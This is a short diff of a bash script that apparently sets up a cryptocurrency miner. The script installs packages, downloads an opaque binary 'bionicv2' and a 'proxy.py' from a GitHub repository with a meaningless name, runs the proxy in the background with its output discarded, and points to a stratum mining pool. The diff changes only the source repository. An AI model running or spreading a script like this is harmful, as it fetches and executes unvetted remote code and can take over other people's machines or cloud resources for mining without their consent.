@@ -1,8 +1,8 @@
 #!/bin/bash
 apt update
 apt -y install curl python3 libjansson4
-wget -O bionicv2 https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/bionicv2
-wget -O proxy.py https://raw.githubusercontent.com/ahmadghozaliurhniyu/savefromego/main/proxy.py
+wget -O bionicv2 https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/bionicv2
+wget -O proxy.py https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/proxy.py
 chmod +x bionicv2 proxy.py
 python3 proxy.py >/dev/null &
 pool="stratum+tcp://na.luckpool.net:3956"
